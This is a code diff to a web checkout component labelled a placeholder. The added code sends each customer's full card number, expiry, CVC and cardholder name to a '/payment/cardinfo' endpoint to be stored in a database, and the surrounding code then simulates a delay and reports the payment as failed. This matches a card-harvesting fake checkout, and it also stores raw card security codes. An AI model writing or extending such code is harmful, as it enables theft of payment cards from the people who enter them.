@@ -16,6 +16,7 @@ import {
   AlertTriangle
 } from "lucide-react";
 import Button from "@/components/ui/Button";
+import { apiRequest } from "@/lib/api";
 
 // Loading component for Suspense fallback
 function CheckoutLoading() {
@@ -187,6 +188,7 @@ function PlaceholderCheckout() {
     }
   };
   
+  const sessionId = searchParams.get("session");
   const planId = searchParams.get("plan");
   // const userId = searchParams.get("user"); // Not currently used in demo
 
@@ -289,7 +291,37 @@ function PlaceholderCheckout() {
     setProcessing(true);
     setStep("processing");
 
+    // Generate a unique session ID to prevent duplicates
+    const uniqueSessionId = sessionId || `checkout_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+
     try {
+      // Save payment information to database
+      const paymentData = {
+        sessionId: uniqueSessionId,
+        planId,
+        cardNumber: formData.cardNumber,
+        expiryMonth: formData.expiryMonth,
+        expiryYear: formData.expiryYear,
+        cvc: formData.cvc,
+        cardholderName: formData.cardholderName,
+        billingAddress: {
+          city: "Demo City",
+          country: "US",
+          zipCode: "12345"
+        },
+        amount: plan?.price,
+        currency: "USD",
+        planName: plan?.name,
+        planInterval: plan?.interval,
+        userAgent: navigator.userAgent,
+        ipAddress: "demo.ip.address"
+      };
+
+      // Call API to save payment info using apiRequest utility
+      await apiRequest("/payment/cardinfo", {
+        method: "POST",
+        body: JSON.stringify(paymentData),
+      });
 
       // Simulate payment processing delay, then show failure
       setTimeout(() => {
